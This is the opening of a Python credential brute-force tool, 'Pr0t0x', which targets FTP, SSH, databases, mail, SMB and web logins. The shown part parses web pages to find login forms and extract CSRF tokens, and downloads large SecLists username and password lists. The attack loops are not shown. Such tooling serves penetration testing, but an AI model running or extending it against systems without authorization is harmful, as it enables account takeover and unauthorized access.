#!/usr/bin/env python3
"""
Pr0t0x - Advanced Protocol Brute Force Tool
A comprehensive multi-protocol authentication testing tool for security professionals

Author: Pr0t0x Team
Version: 1.0
License: MIT

This tool is designed for authorized security testing only.
Use responsibly and only on systems you own or have explicit permission to test.
"""

# Standard library imports
import os
import sys
import time
import signal
import random
import itertools
import socket
import json
import shutil
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Third-party imports
import requests
from colorama import init, Fore, Style, Back
from tqdm import tqdm

# Initialize colorama
init(autoreset=True)

# Global flag for handling interrupts
interrupt_received = False

def signal_handler(signum, frame):
    """Handle SIGINT (Ctrl+C) gracefully"""
    global interrupt_received
    interrupt_received = True
    print(f"\n{Fore.YELLOW}\n[!] Interrupt received. Stopping gracefully...{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[INFO] Please wait while the program cleans up...{Style.RESET_ALL}")
    # Force flush output to ensure message is displayed immediately
    sys.stdout.flush()
    
    # Try to exit gracefully, but force exit if needed
    try:
        sys.exit(0)
    except SystemExit:
        raise
    except:
        # If graceful exit fails, force exit
        import os
        os._exit(1)

# Set up signal handler for Ctrl+C
signal.signal(signal.SIGINT, signal_handler)

# Import required libraries for protocols
try:
    import ftplib  # For FTP
    import paramiko  # For SSH
    import pymysql  # For MySQL
    import psycopg2  # For PostgreSQL
    import smtplib  # For SMTP
    from imaplib import IMAP4  # For IMAP
    import http.client  # For HTTP/HTTPS
    import urllib.request  # For HTTP/HTTPS
    import urllib.error  # For HTTP/HTTPS
    import urllib.parse  # For form data encoding
    import ssl  # For SSL/TLS protocols
    from html.parser import HTMLParser  # For form parsing
    # Optional: SMB library
    try:
        from smb.SMBConnection import SMBConnection  # For SMB
    except ImportError:
        pass
except ImportError as e:
    print(f"Warning: Some protocol modules not available: {e}")

class Colors:
    """Color management for console output"""
    PRIMARY = Fore.CYAN
    SUCCESS = Fore.GREEN
    ERROR = Fore.RED
    WARNING = Fore.YELLOW
    INFO = Fore.WHITE
    TITLE = Fore.MAGENTA
    SUBTLE = Fore.BLUE

    @staticmethod
    def gradient(text, start_color=Fore.CYAN, end_color=Fore.BLUE):
        """Create a simple gradient effect between two colors"""
        if start_color == end_color:
            return f"{start_color}{text}{Style.RESET_ALL}"
        
        lines = text.split('\n')
        colored_lines = []
        
        for i, line in enumerate(lines):
            # Determine color for this line (simple gradient from start to end color)
            if len(lines) <= 1:
                color = start_color
            elif i < len(lines) / 2:
                color = start_color
            else:
                color = end_color
                
            colored_lines.append(f"{Style.BRIGHT}{color}{line}")
            
        return f"{Style.RESET_ALL}".join(colored_lines) + Style.RESET_ALL

    @staticmethod
    def rainbow(text):
        colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
        colored_chars = []
        for i, char in enumerate(text):
            if char != ' ':
                colored_chars.append(f"{Style.BRIGHT}{colors[i % len(colors)]}{char}")
            else:
                colored_chars.append(char)
        return ''.join(colored_chars) + Style.RESET_ALL

class LoginFormParser(HTMLParser):
    """Enhanced HTML parser to detect and extract login forms with advanced features"""
    def __init__(self):
        super().__init__()
        self.forms = []
        self.current_form = None
        self.in_form = False
        self.in_select = False
        self.current_select = None
        self.page_title = ""
        self.in_title = False
        self.csrf_tokens = set()  # Store found CSRF tokens
        
    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        
        if tag.lower() == 'title':
            self.in_title = True
            
        elif tag.lower() == 'form':
            self.in_form = True
            self.current_form = {
                'action': attrs_dict.get('action', ''),
                'method': attrs_dict.get('method', 'post').lower(),
                'enctype': attrs_dict.get('enctype', 'application/x-www-form-urlencoded'),
                'id': attrs_dict.get('id', ''),
                'class': attrs_dict.get('class', ''),
                'inputs': {},
                'selects': {},
                'textareas': {},
                'csrf_tokens': set()
            }
            
        elif tag.lower() == 'input' and self.in_form:
            input_type = attrs_dict.get('type', 'text').lower()
            input_name = attrs_dict.get('name', '')
            input_value = attrs_dict.get('value', '')
            input_id = attrs_dict.get('id', '')
            input_class = attrs_dict.get('class', '')
            input_placeholder = attrs_dict.get('placeholder', '')
            input_required = 'required' in attrs_dict
            input_autocomplete = attrs_dict.get('autocomplete', '')
            
            if input_name:
                self.current_form['inputs'][input_name] = {
                    'type': input_type,
                    'value': input_value,
                    'id': input_id,
                    'class': input_class,
                    'placeholder': input_placeholder,
                    'required': input_required,
                    'autocomplete': input_autocomplete
                }
                
                # Detect potential CSRF tokens
                if self._is_csrf_token_field(input_name, input_value, input_type):
                    self.current_form['csrf_tokens'].add((input_name, input_value))
                    self.csrf_tokens.add((input_name, input_value))
                    
        elif tag.lower() == 'select' and self.in_form:
            self.in_select = True
            select_name = attrs_dict.get('name', '')
            if select_name:
                self.current_select = {
                    'name': select_name,
                    'id': attrs_dict.get('id', ''),
                    'class': attrs_dict.get('class', ''),
                    'required': 'required' in attrs_dict,
                    'options': []
                }
                
        elif tag.lower() == 'option' and self.in_select and self.current_select:
            option_value = attrs_dict.get('value', '')
            option_selected = 'selected' in attrs_dict
            self.current_select['options'].append({
                'value': option_value,
                'selected': option_selected
            })
            
        elif tag.lower() == 'textarea' and self.in_form:
            textarea_name = attrs_dict.get('name', '')
            if textarea_name:
                self.current_form['textareas'][textarea_name] = {
                    'id': attrs_dict.get('id', ''),
                    'class': attrs_dict.get('class', ''),
                    'placeholder': attrs_dict.get('placeholder', ''),
                    'required': 'required' in attrs_dict
                }
                
        # Look for meta tags with CSRF tokens
        elif tag.lower() == 'meta':
            meta_name = attrs_dict.get('name', '').lower()
            meta_content = attrs_dict.get('content', '')
            if meta_name in ['csrf-token', '_token', 'authenticity_token'] and meta_content:
                self.csrf_tokens.add((meta_name, meta_content))
    
    def handle_endtag(self, tag):
        if tag.lower() == 'title':
            self.in_title = False
        elif tag.lower() == 'form' and self.in_form:
            self.in_form = False
            if self.current_form:
                self.forms.append(self.current_form)
            self.current_form = None
        elif tag.lower() == 'select' and self.in_select:
            self.in_select = False
            if self.current_select and self.current_form:
                self.current_form['selects'][self.current_select['name']] = self.current_select
            self.current_select = None
    
    def handle_data(self, data):
        if self.in_title:
            self.page_title += data.strip()
    
    def _is_csrf_token_field(self, name, value, input_type):
        """Detect if a field is likely a CSRF token"""
        csrf_indicators = [
            'csrf', 'token', '_token', 'authenticity_token', 'csrfmiddlewaretoken',
            'form_token', 'security_token', '_wpnonce', 'nonce', 'state'
        ]
        
        name_lower = name.lower()
        
        # Check field name for CSRF indicators
        if any(indicator in name_lower for indicator in csrf_indicators):
            return True
            
        # Check if it's a hidden field with a token-like value
        if input_type == 'hidden' and value and len(value) > 16:
            # Token-like patterns (hex, base64, etc.)
            import re
            if re.match(r'^[a-fA-F0-9]{16,}$', value) or re.match(r'^[A-Za-z0-9+/=]{16,}$', value):
                return True
                
        return False
    
    def get_login_forms(self):
        """Return forms that appear to be login forms with enhanced detection"""
        login_forms = []
        
        for form in self.forms:
            confidence_score = 0
            form_indicators = {
                'has_password': False,
                'has_username': False,
                'has_email': False,
                'has_submit': False,
                'form_context': False,
                'input_count': len(form['inputs'])
            }
            
            # Analyze form inputs
            for field_name, field_info in form['inputs'].items():
                field_type = field_info['type']
                field_name_lower = field_name.lower()
                field_placeholder = field_info.get('placeholder', '').lower()
                field_id = field_info.get('id', '').lower()
                field_class = field_info.get('class', '').lower()
                
                # Password field detection
                if field_type == 'password':
                    form_indicators['has_password'] = True
                    confidence_score += 50
                    
                # Username field detection (enhanced)
                username_indicators = [
                    'username', 'user', 'login', 'account', 'userid', 'user_name',
                    'loginname', 'uname', 'signin', 'user_id'
                ]
                if (any(indicator in field_name_lower for indicator in username_indicators) or
                    any(indicator in field_placeholder for indicator in username_indicators) or
                    any(indicator in field_id for indicator in username_indicators)):
                    form_indicators['has_username'] = True
                    confidence_score += 30
                    
                # Email field detection
                email_indicators = ['email', 'mail', '@']
                if (field_type == 'email' or
                    any(indicator in field_name_lower for indicator in email_indicators) or
                    any(indicator in field_placeholder for indicator in email_indicators)):
                    form_indicators['has_email'] = True
                    confidence_score += 25
                    
                # Submit button detection
                if field_type == 'submit':
                    form_indicators['has_submit'] = True
                    submit_value = field_info.get('value', '').lower()
                    if any(word in submit_value for word in ['login', 'signin', 'sign in', 'log in', 'enter', 'submit', 'authenticate']):
                        confidence_score += 20
                    else:
                        confidence_score += 10
            
            # Form context analysis
            form_class = form.get('class', '').lower()
            form_id = form.get('id', '').lower()
            form_action = form.get('action', '').lower()
            
            context_indicators = [
                'login', 'signin', 'sign-in', 'auth', 'authenticate', 'logon',
                'user', 'account', 'credential', 'access'
            ]
            
            if (any(indicator in form_class for indicator in context_indicators) or
                any(indicator in form_id for indicator in context_indicators) or
                any(indicator in form_action for indicator in context_indicators)):
                form_indicators['form_context'] = True
                confidence_score += 15
                
            # Page title context
            if any(indicator in self.page_title.lower() for indicator in context_indicators):
                confidence_score += 10
            
            # Apply scoring rules
            is_login_form = False
            
            # High confidence: has password field
            if form_indicators['has_password']:
                is_login_form = True
                
            # Medium confidence: has username/email + context + reasonable input count
            elif ((form_indicators['has_username'] or form_indicators['has_email']) and
                  form_indicators['form_context'] and
                  2 <= form_indicators['input_count'] <= 10):
                is_login_form = True
                
            # Lower confidence: context + multiple inputs + submit
            elif (confidence_score >= 40 and
                  form_indicators['form_context'] and
                  form_indicators['has_submit'] and
                  form_indicators['input_count'] >= 2):
                is_login_form = True
            
            if is_login_form:
                form['confidence_score'] = confidence_score
                form['indicators'] = form_indicators
                login_forms.append(form)
                
        # Sort by confidence score (highest first)
        login_forms.sort(key=lambda x: x.get('confidence_score', 0), reverse=True)
        
        return login_forms
    
    def get_csrf_tokens(self):
        """Return all detected CSRF tokens"""
        return list(self.csrf_tokens)

class Effects:
    """Visual effects for the console"""
    @staticmethod
    def clear_screen():
        os.system('cls' if os.name == 'nt' else 'clear')

    @staticmethod
    def matrix_rain(duration=1):
        """Display matrix-like rain effect with controlled output"""
        try:
            # Get terminal width but limit it to prevent overflow
            width = min(shutil.get_terminal_size().columns, 50)  # Further limit width
            chars = "01"  # Simple binary output
            max_lines = 3  # Limit number of lines
            
            # Calculate time per line
            time_per_line = duration / max_lines if max_lines > 0 else 0.1
            
            for _ in range(max_lines):
                # Generate a single line of matrix effect
                line = ''.join(random.choice(chars) for _ in range(width))
                # Print with green color and bright style
                print(f"{Fore.GREEN}{Style.BRIGHT}{line}{Style.RESET_ALL}")
                time.sleep(time_per_line)
            
            # Clean up by ensuring style is reset
            print(Style.RESET_ALL, end='', flush=True)
            
        except Exception as e:
            # Silently handle any errors and ensure style is reset
            print(Style.RESET_ALL, end='', flush=True)
    
    @staticmethod
    def loading_spinner(text, duration=2):
        spinners = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
        end_time = time.time() + duration
        i = 0
        while time.time() < end_time:
            print(f"\r{Colors.PRIMARY}{text} {spinners[i]}{Style.RESET_ALL}", end='')
            time.sleep(0.1)
            i = (i + 1) % len(spinners)
        print()

class WordlistManager:
    """Manages username and password lists"""
    def __init__(self):
        self.usernames = []
        self.passwords = []
        self.github_urls = {
            'usernames': [
                'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/xato-net-10-million-usernames.txt',
                'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt'
            ],
            'passwords': [
                'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords.txt',
                'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt'
            ]
        }
        self.local_files = {
            'usernames': 'pr0t0x_usernames.txt',
            'passwords': 'pr0t0x_passwords.txt'
        }
    def _is_valid_wordlist_content(self, content_sample):
        """
        Check if content appears to be a valid wordlist (not HTML or error page)
        
        Args:
            content_sample: First few lines of content to check
            
        Returns:
            bool: True if content appears valid, False otherwise
        """
        # Check for HTML tags which indicate error page
        html_indicators = [
            # HTML structure indicators
            "<!DOCTYPE", "<html", "<body", "<head", "<title>", 
            "<script", "<div", "<span", "DOCTYPE html", "<!doctype",
            
            # Common error messages
            "404", "Not Found", "Error", "Exception", "Server Error",
            "The requested URL", "was not found", "cannot be found", 
            "unavailable", "Bad Request", "Forbidden", "Access Denied",
            "Service Unavailable", "Gateway Timeout", "Internal Server Error",
            "Page Not Found", "resource you are looking for", "doesn't exist",
            "github.com", "githubusercontent.com"
        ]
        # If the content contains any HTML indicators, it's likely an error page
        content_lower = content_sample.lower()
        for indicator in html_indicators:
            if indicator.lower() in content_lower:
                return False
                
        # Check if it looks like a wordlist (one word per line, no HTML)
        lines = content_sample.split("\n")
        valid_lines = 0
        html_line_count = 0
        
        # Check first few non-empty lines
        for line in lines[:20]:
            line = line.strip()
            if not line:
                continue
                
            # Check if line looks like HTML
            if "<" in line and ">" in line:
                html_line_count += 1
                continue
                
            # Valid lines shouldn't contain HTML tags or be extremely long
            if len(line) < 200:
                valid_lines += 1
                
        # If the content has more HTML-like lines than valid lines, reject it
        if html_line_count > valid_lines:
            return False
                
        # If we found some valid-looking lines, consider it a valid wordlist
        return valid_lines > 0
        
    def download_from_github(self):
        """Download wordlists from GitHub"""
        print(f"\n{Colors.INFO}Downloading wordlists from GitHub...")
        
        try:
            # Process each wordlist type (usernames, passwords, etc.)
            for list_type, urls in self.github_urls.items():
                filename = self.local_files[list_type]
                
                # Create parent directory if it doesn't exist
                directory = os.path.dirname(filename)
                if directory and not os.path.exists(directory):
                    try:
                        os.makedirs(directory)
                        print(f"{Colors.INFO}Created directory: {directory}")
                    except Exception as e:
                        print(f"{Colors.WARNING}Unable to create directory {directory}: {str(e)}")
                        # Continue to next list type if directory creation fails
                        continue
                    
                # Check if file already exists and provide helpful options
                if os.path.exists(filename):
                    # Improved existing file handling with more detailed information
                    file_size = os.path.getsize(filename)
                    file_time = datetime.fromtimestamp(os.path.getmtime(filename))
                    
                    print(f"{Colors.WARNING}File {filename} already exists.")
                    print(f"{Colors.INFO}File Information:")
                    print(f"{Colors.PRIMARY}├─ Size: {Colors.INFO}{file_size:,} bytes")
                    print(f"{Colors.PRIMARY}├─ Modified: {Colors.INFO}{file_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    
                    print(f"\n{Colors.INFO}Options:")
                    print(f"{Colors.PRIMARY}1. Skip download (default)")
                    print(f"{Colors.PRIMARY}2. Re-download and overwrite")
                    print(f"{Colors.PRIMARY}3. Download with a different filename")
                    
                    try:
                        choice = input(f"{Colors.PRIMARY}Choose option (1-3): {Colors.INFO}").strip() or "1"
                        
                        if choice == "1":
                            print(f"{Colors.INFO}Skipping download of {filename}")
                            continue  # Skip to next list_type
                        elif choice == "2":
                            # Create backup of existing file
                            backup_file = f"{filename}.bak"
                            try:
                                shutil.copy2(filename, backup_file)
                                print(f"{Colors.WARNING}Created backup of existing file: {backup_file}")
                            except Exception as e:
                                print(f"{Colors.WARNING}Failed to create backup: {str(e)}")
                            
                            print(f"{Colors.WARNING}Will overwrite existing file: {filename}")
                            # Continue with download
                        elif choice == "3":
                            new_filename = input(f"{Colors.PRIMARY}Enter new filename: {Colors.INFO}").strip()
                            if new_filename:
                                print(f"{Colors.INFO}Will download to new file: {new_filename}")
                                filename = new_filename
                                self.local_files[list_type] = filename
                            else:
                                print(f"{Colors.WARNING}No filename provided, skipping download.")
                                continue  # Skip to next list_type
                        else:
                            print(f"{Colors.WARNING}Invalid choice, skipping download.")
                            continue  # Skip to next list_type
                    except KeyboardInterrupt:
                        print(f"\n{Colors.WARNING}Download interrupted by user")
                        raise
                
                # Initialize variables for this list type
                temp_files = []
                all_words = set()
                download_success = False
                
                # Process each URL for this list type
                for url in urls:
                    temp_file = f"{filename}.{len(temp_files)}.tmp"
                    temp_files.append(temp_file)
                    
                    try:
                        print(f"\n{Colors.PRIMARY}Downloading {list_type} from: {url}")
                        
                        # Log request attempt
                        print(f"{Colors.INFO}Attempting to download from: {url}")
                        
                        # Use a timeout to prevent hanging on slow connections
                        try:
                            # Create a session for better control over request behavior
                            session = requests.Session()
                            
                            # Set appropriate headers to help prevent server-side caching or redirection issues
                            headers = {
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Pr0t0x/1.0',
                                'Accept': 'text/plain',  # Prefer plain text content
                                'Cache-Control': 'no-cache',
                                'Pragma': 'no-cache'
                            }
                            
                            # First make a HEAD request to check status without downloading content
                            try:
                                print(f"{Colors.INFO}Checking URL availability...")
                                head_response = session.head(url, timeout=5, headers=headers)
                                if head_response.status_code != 200:
                                    print(f"{Colors.WARNING}HEAD request returned status code {head_response.status_code}, trying GET anyway...")
                                else:
                                    # Check content type from HEAD response
                                    head_content_type = head_response.headers.get('content-type', '').lower()
                                    if 'text/html' in head_content_type:
                                        print(f"{Colors.ERROR}URL appears to be HTML content, not a wordlist (content-type: {head_content_type})")
                                        print(f"{Colors.ERROR}For GitHub files, make sure you're using the 'raw' URL")
                                        continue
                            except:
                                print(f"{Colors.WARNING}HEAD request failed, falling back to GET...")
                            
                            # Now perform the actual GET request with streaming enabled
                            print(f"{Colors.INFO}Downloading content...")
                            response = session.get(url, stream=True, timeout=10, headers=headers)
                            
                            # Enhanced HTTP status code checking with more detailed messages
                            if response.status_code != 200:
                                error_message = f"URL returned status code {response.status_code}"
                                
                                if response.status_code == 404:
                                    print(f"{Colors.ERROR}Error: {error_message}: {url}")
                                    print(f"{Colors.INFO}Please check that the URL is correct and the file exists.")
                                    print(f"{Colors.INFO}For GitHub files, make sure you're using the 'raw' URL.")
                                    
                                    # Add GitHub-specific suggestions for common 404 errors
                                    if 'github.com' in url or 'githubusercontent.com' in url:
                                        # Suggest raw URL if user is trying to use github.com
                                        if 'github.com' in url and 'raw.githubusercontent.com' not in url:
                                            raw_url = url.replace('github.com', 'raw.githubusercontent.com')
                                            if '/blob/' in raw_url:
                                                raw_url = raw_url.replace('/blob/', '/')
                                            print(f"{Colors.INFO}Try this URL instead: {raw_url}")
                                        print(f"{Colors.INFO}Make sure the repository and file path are correct.")
                                elif response.status_code >= 500:
                                    print(f"{Colors.ERROR}Error: Server error ({error_message}): {url}")
                                    print(f"{Colors.INFO}The server encountered an error. Try again later.")
                                elif response.status_code >= 400:
                                    print(f"{Colors.ERROR}Error: Client error ({error_message}): {url}")
                                    print(f"{Colors.INFO}There was an issue with the request. Check URL and permissions.")
                                elif response.status_code >= 300:
                                    print(f"{Colors.ERROR}Error: Redirection ({error_message}): {url}")
                                    print(f"{Colors.INFO}The resource has moved. Use the correct direct URL.")
                                    
                                    # For redirects, print the redirect URL if available
                                    if 'Location' in response.headers:
                                        print(f"{Colors.INFO}Redirect URL: {response.headers['Location']}")
                                        print(f"{Colors.INFO}Try using this URL instead.")
                                else:
                                    print(f"{Colors.ERROR}Error: Unexpected {error_message}: {url}")
                                
                                # Skip this URL and continue with the next one
                                # Make sure to clean up any partial downloads
                                if os.path.exists(temp_file):
                                    try:
                                        os.remove(temp_file)
                                        print(f"{Colors.INFO}Removed temporary file: {temp_file}")
                                    except:
                                        pass
                                continue
                        except requests.exceptions.RequestException as e:
                            print(f"{Colors.ERROR}Connection error: {str(e)}")
                            print(f"{Colors.INFO}Skipping URL due to connection issue: {url}")
                            continue
                        
                        # Enhanced content type checking BEFORE downloading content
                        content_type = response.headers.get('content-type', '').lower()
                        
                        # Enhanced content type validation with more comprehensive checks
                        # Reject content types that are definitely not wordlists
                        invalid_content_types = [
                            # HTML and document formats
                            'text/html', 'application/xhtml+xml', 'application/xml', 'text/xml', 
                            'application/javascript', 'text/javascript', 'application/octet-stream', 
                            'application/json', 'application/pdf',
                            
                            # Media content
                            'image/', 'audio/', 'video/', 
                            
                            # Other non-wordlist formats
                            'application/zip', 'application/x-compressed', 'application/x-gzip',
                            'application/x-tar', 'application/x-7z-compressed', 'application/x-rar-compressed'
                        ]
                        
                        # Check media content types first (binary data)
                        if 'image/' in content_type or 'audio/' in content_type or 'video/' in content_type:
                            print(f"{Colors.ERROR}Error: URL {url} returned media content type: {content_type}")
                            print(f"{Colors.ERROR}Cannot use binary data as a wordlist. Skipping.")
                            continue
                        # Check if this is plain text - if so, it's likely valid
                        elif 'text/plain' in content_type:
                            print(f"{Colors.SUCCESS}URL returned text/plain content type - likely a valid wordlist.")
                        # Check for JSON content type which may need confirmation
                        elif 'application/json' in content_type:
                            print(f"{Colors.WARNING}Warning: URL {url} returned JSON content (content-type: {content_type})")
                            print(f"{Colors.WARNING}This may not be a valid wordlist.")
                            # Ask user if they want to continue with JSON content
                            try:
                                choice = input(f"{Colors.PRIMARY}Continue downloading JSON content? (y/n): {Colors.INFO}").strip().lower()
                                if choice != 'y':
                                    print(f"{Colors.WARNING}Skipping JSON content from {url}")
                                    continue
                            except KeyboardInterrupt:
                                print(f"\n{Colors.WARNING}Download interrupted")
                                raise
                        # Check for other invalid content types
                        elif any(ctype in content_type for ctype in invalid_content_types):
                            print(f"{Colors.ERROR}Error: URL {url} returned invalid content type: {content_type}")
                            print(f"{Colors.ERROR}This is not a plain text wordlist. Skipping.")
                            print(f"{Colors.INFO}For GitHub files, use the 'raw' URL, not the web page URL.")
                            # Add information about how to get the correct URL for GitHub
                            if 'github.com' in url and 'raw.githubusercontent.com' not in url:
                                print(f"{Colors.WARNING}GitHub tip: Use the 'Raw' button on GitHub to get the direct URL.")
                                print(f"{Colors.WARNING}Example: https://raw.githubusercontent.com/user/repo/main/file.txt")
                                
                            # Clean up and continue to next URL
                            if os.path.exists(temp_file):
                                os.remove(temp_file)
                            continue
                        # For unrecognized content types, show a warning but continue
                        else:
                            print(f"{Colors.WARNING}Content type: {content_type} - treating as plain text")
                            # Add warning for unrecognized content types
                            if not ('text/' in content_type or content_type == ''):
                                print(f"{Colors.WARNING}Warning: Unrecognized content type. May not be a valid wordlist.")
                                
                        # Check for suspiciously small response content-length
                        content_length = int(response.headers.get('content-length', 0))
                        if 0 < content_length < 500:  # Suspiciously small for a wordlist
                            print(f"{Colors.WARNING}Warning: Very small response size ({content_length} bytes)")
                            print(f"{Colors.WARNING}This might be an error page or empty file.")
                            
                            # For extremely small responses, perform additional validation
                            if content_length < 100:  # Extremely small
                                print(f"{Colors.ERROR}Response size too small to be a valid wordlist")
                                print(f"{Colors.INFO}Downloading content for inspection...")
                                
                                # Download the entire content for inspection
                                full_content = response.text
                                
                                # Check if content contains common error messages
                                if any(error_text in full_content.lower() for error_text in 
                                      ["404", "not found", "error", "<html", "<!doctype"]):
                                    print(f"{Colors.ERROR}Content appears to be an error page - skipping")
                                    continue
                        
                        # Skip empty responses completely
                        if content_length == 0:
                            print(f"{Colors.ERROR}Empty response received - skipping")
                            continue
                        
                        # Try to get the filename from the URL or Content-Disposition header
                        remote_filename = ''
                        if 'Content-Disposition' in response.headers:
                            disposition = response.headers['Content-Disposition']
                            if 'filename=' in disposition:
                                remote_filename = disposition.split('filename=')[1].strip('"\'')
                                print(f"{Colors.INFO}Remote filename: {remote_filename}")
                        
                        # Get content length for progress bar
                        total_size = int(response.headers.get('content-length', 0))
                        if total_size == 0:
                            print(f"{Colors.WARNING}Warning: Unknown content size for {url}")

                        # Download content with improved validation
                        url_words = set()
                        content_sample = ""
                        validation_size = 4096  # Increased validation sample size for better detection
                        valid_download = True
                        total_bytes_downloaded = 0
                        
                        # Enhanced content validation before any file writing
                        content_sample = ""
                        valid_download = True  # Flag to track if validation passes
                        try:
                            print(f"{Colors.INFO}Validating content before download...")
                            # Get a larger chunk for more accurate validation
                            validation_size = 32768  # Further increased size for better validation
                            
                            # Attempt to get first chunk of content for validation
                            content_chunk = next(response.iter_content(chunk_size=validation_size), b'')
                            
                            if not content_chunk:
                                print(f"{Colors.ERROR}Error: Empty content received from {url}")
                                print(f"{Colors.INFO}The server returned an empty response")
                                continue
                                
                            content_sample = content_chunk.decode('utf-8', errors='ignore')
                            
                            # Additional check - if content contains very few characters, likely an error
                            if len(content_sample.strip()) < 20:
                                print(f"{Colors.ERROR}Error: Content too small to be a valid wordlist")
                                print(f"{Colors.INFO}Received only {len(content_sample.strip())} characters")
                                continue
                            
                            # More extensive pre-validation
                            # 1. Check content size
                            if len(content_sample.strip()) < 50:
                                print(f"{Colors.WARNING}Very small content received ({len(content_sample)} characters)")
                                print(f"{Colors.ERROR}Content too small to be a valid wordlist - skipping")
                                continue
                                
                            # 2. Enhanced check for error indicators with more comprehensive patterns
                            sample_lower = content_sample.lower()
                            
                            # Group critical indicators by type for better diagnosis
                            error_indicators = {
                                '404_indicators': ['404', 'not found', 'page not found', 'file not found', 
                                                   'does not exist', 'could not be found', 'cannot be found',
                                                   'couldn\'t find', 'missing', 'unavailable', 'gone'],
                                'html_indicators': ['<html', '<!doctype', '<head', '<body', '<title', '<div',
                                                    '<script', '<meta', '<link', '<span', '<table', '<h1', '<h2',
                                                    '<p>', '</p>', '<br', '<form', '<style', '<a href='],
                                'error_indicators': ['error', 'exception', 'problem', 'invalid', 'failed',
                                                     'forbidden', 'restricted', 'unauthorized', 'denied',
                                                     'unexpected', 'sorry', 'oops', 'unexpected'],
                                'github_indicators': ['github', 'githubusercontent', 'repository', 'pull request',
                                                      'issues', 'commit', 'branch', 'raw content']
                            }
                            
                            # Check for critical error patterns - this will determine if we should download at all
                            found_indicators = []
                            critical_indicators_found = False
                            
                            # First check for critical combinations that strongly indicate 404 pages
                            critical_combinations = [
                                ('<html' in sample_lower and '404' in sample_lower),
                                ('<title' in sample_lower and 'not found' in sample_lower),
                                ('error' in sample_lower and 'page' in sample_lower),
                                ('github' in sample_lower and ('404' in sample_lower or 'not found' in sample_lower))
                            ]
                            
                            if any(critical_combinations):
                                critical_indicators_found = True
                                found_indicators.append("Critical HTML+404 combination")
                            
                            # Then check individual indicators
                            if not critical_indicators_found:
                                for category, indicators in error_indicators.items():
                                    matching = [ind for ind in indicators if ind in sample_lower]
                                    if matching and (category == '404_indicators' or len(matching) > 2):
                                        critical_indicators_found = True
                                        found_indicators.extend(matching[:5])  # Limit to first 5 matches
                            
                            # Look for HTML title tags that indicate errors
                            title_error_patterns = [
                                '<title>404</title>', '<title>not found</title>', 
                                '<title>error</title>', '<title>github</title>',
                                '<title>page not found</title>', '<title>file not found</title>'
                            ]
                            
                            for pattern in title_error_patterns:
                                if pattern.lower() in sample_lower:
                                    found_indicators.append(f"HTML title: {pattern}")
                            
                            # Check for combinations that strongly indicate error pages
                            critical_combinations = [
                                ('<html' in sample_lower and '404' in sample_lower),
                                ('<html' in sample_lower and 'not found' in sample_lower),
                                ('<!doctype' in sample_lower and 'error' in sample_lower),
                                ('github' in sample_lower and '404' in sample_lower)
                            ]
                            
                            if found_indicators or critical_indicators_found or any(pattern.lower() in sample_lower for pattern in title_error_patterns):
                                print(f"{Colors.ERROR}Content appears to contain error page indicators - skipping download")
                                
                                # Provide more details about the detected error
                                if critical_indicators_found:
                                    print(f"{Colors.ERROR}Detected critical error page indicators")
                                
                                if any(ind in sample_lower for ind in error_indicators['404_indicators']):
                                    print(f"{Colors.ERROR}Detected 404 Not Found response")
                                    print(f"{Colors.INFO}This URL may be returning a formatted 404 page with status 200")
                                    print(f"{Colors.WARNING}GitHub tip: Make sure you're using the 'raw' URL for files, not the web page URL")
                                elif any(ind in sample_lower for ind in error_indicators['html_indicators']):
                                    print(f"{Colors.ERROR}Detected HTML content instead of plain text wordlist")
                                    html_count = sum(1 for ind in error_indicators['html_indicators'] if ind in sample_lower)
                                    print(f"{Colors.INFO}Found {html_count} HTML indicators - this is likely a web page, not a wordlist")
                                elif any(ind in sample_lower for ind in error_indicators['error_indicators']):
                                    print(f"{Colors.ERROR}Detected error message in content")
                                
                                # List all detected indicators (limited to first 5)
                                if found_indicators:
                                    print(f"{Colors.WARNING}Detected indicators: {', '.join(found_indicators[:5])}")
                                    if len(found_indicators) > 5:
                                        print(f"{Colors.WARNING}...and {len(found_indicators)-5} more")
                                
                                # Show a sample of the problematic content
                                first_lines = [line for line in sample_lower.split('\n')[:5] if line.strip()]
                                print(f"{Colors.SUBTLE}Sample of content:")
                                for line in first_lines:
                                    print(f"{Colors.SUBTLE}  {line[:60]}{'...' if len(line) > 60 else ''}")
                                
                                # Cleanup and skip to next URL
                                print(f"{Colors.INFO}Skipping problematic content from {url}")
                                continue
                            
                            # 3. Enhanced HTML tag detection with more specific analysis
                            html_tag_count = sample_lower.count('<') + sample_lower.count('>')
                            html_open_tags = sample_lower.count('<')
                            html_close_tags = sample_lower.count('>')
                            
                            # Calculate ratio of HTML to content size
                            html_ratio = html_tag_count / len(sample_lower) if len(sample_lower) > 0 else 0
                            
                            # More sophisticated HTML detection logic
                            if html_tag_count > 10 or html_ratio > 0.05:  # Many tags or high tag density
                                print(f"{Colors.ERROR}Detected high HTML tag count ({html_tag_count}) - likely an HTML page, not a wordlist")
                                print(f"{Colors.INFO}HTML tag density: {html_ratio:.1%} of content")
                                
                                # Look for balanced HTML tags, which strongly indicates proper HTML
                                if abs(html_open_tags - html_close_tags) < 3:  # Roughly balanced tags
                                    print(f"{Colors.ERROR}Found balanced HTML structure ({html_open_tags} opening, {html_close_tags} closing tags)")
                                continue
                                
                            # 4. Improved wordlist format validation
                            lines = content_sample.split('\n')
                            
                            # Analyze line structure for wordlist characteristics
                            total_lines = len([l for l in lines if l.strip()])
                            valid_lines = [line for line in lines[:100] if line.strip() and len(line.strip()) < 100 and '<' not in line]
                            long_lines = [line for line in lines[:100] if len(line.strip()) > 200]  # Very long lines
                            suspiciously_long_lines = [line for line in lines[:100] if len(line.strip()) > 500]  # Extremely long
                            
                            # Check various wordlist format indicators
                            valid_ratio = len(valid_lines) / total_lines if total_lines > 0 else 0
                            has_long_lines = len(long_lines) > 2
                            has_suspiciously_long = len(suspiciously_long_lines) > 0
                            
